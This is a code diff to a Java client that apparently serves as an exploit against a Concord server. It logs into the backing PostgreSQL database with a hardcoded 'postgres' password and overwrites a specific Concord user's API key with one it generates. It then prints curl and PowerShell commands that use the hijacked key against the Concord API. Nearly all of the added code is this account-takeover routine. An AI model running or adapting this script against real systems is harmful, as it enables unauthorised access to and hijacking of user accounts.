@@ -19,7 +19,10 @@ public class Client {
 
         Encoder e = Base64.getEncoder().withoutPadding();
         String s =  e.encodeToString(ab);
-        System.out.println(String.format("Secure Random: %s", s));
+
+        return s;
+   }
+   public static String generateAPIKeyHash(String secureRandom) {
         MessageDigest md;
         try {
             md = MessageDigest.getInstance("SHA-256");
@@ -27,7 +30,7 @@ public class Client {
             throw new RuntimeException(ex);
         }
 
-        byte[] hash = Base64.getDecoder().decode(s);
+        byte[] hash = Base64.getDecoder().decode(secureRandom);
         hash = md.digest(hash);
         String api_key = Base64.getEncoder().withoutPadding().encodeToString(hash);
         System.out.println(String.format("ApiKey: %s", api_key));
@@ -35,6 +38,26 @@ public class Client {
    }
    public static void insert(Connection c, String table, List<String> columns, String ... values) {
 
+   }
+   public static void update(Connection c) {
+      try {
+         Statement stmt = null;
+         String apiKey = generateSecureRandom();
+         String sql = String.format("UPDATE api_keys SET api_key = '%s' where user_id = 'd4f123c1-f8d4-40b2-8a12-b8947b9ce2d8'", generateAPIKeyHash(apiKey));
+         stmt = c.createStatement();
+         stmt.executeUpdate(sql);
+         //ResultSet rs = stmt.executeQuery(sql);
+         System.out.print("(+) Updating api key for concord user");
+         System.out.println(String.format("APIKey: %s", apiKey));
+         System.out.println(String.format("Powershell: iwr -Uri 'http://concord:8001/api/v1/apikey' -Headers @{ Authorization = \"%s\";ContentType= \"application/json\"}", apiKey));
+         System.out.println(String.format("Bash: curl -H \"authorization: %s\" -H \"Content-Type: application/json\"  http://concord:8001/api/v1/apikey", apiKey));
+         //rs.close();
+         stmt.close();
+      } catch(Exception e) {
+         System.err.println("(-) Failure in Update");
+         System.err.println(e.getClass().getName()+": "+e.getMessage());
+         System.exit(0);
+      }     
    }
    public static void getPermissions(Connection c, String table) {
       System.out.println(String.format("(+) Attempting to retrieve permissions for table: %s", table));
@@ -138,6 +161,20 @@ public class Client {
       }
       
    }
+   public static void updateAPIKey(String db, String port) {
+      try {
+         Connection c = null;
+         Statement stmt = null;
+         Class.forName("org.postgresql.Driver");
+         String url = String.format("jdbc:postgresql://%s:%s/postgres", db, port);
+         c = DriverManager.getConnection(url, "postgres", "quake1quake2quake3arena");
+         update(c);
+      } catch(Exception e) {
+         System.err.println("(-) Failure in Test");
+         System.err.println(e.getClass().getName()+": "+e.getMessage());
+         System.exit(0);
+      }
+   }
    public static void dbExtract(String db, String port ) {
       try {
          Connection c = null;
@@ -187,8 +224,9 @@ public class Client {
             db = args[0];
             port = args[1];
          }
-         dbExtract(db, port);
-         generateSecureRandom();
+         //dbExtract(db, port);
+         //generateSecureRandom();
+         updateAPIKey(db, port);
          
       } catch (Exception e) {
          e.printStackTrace();
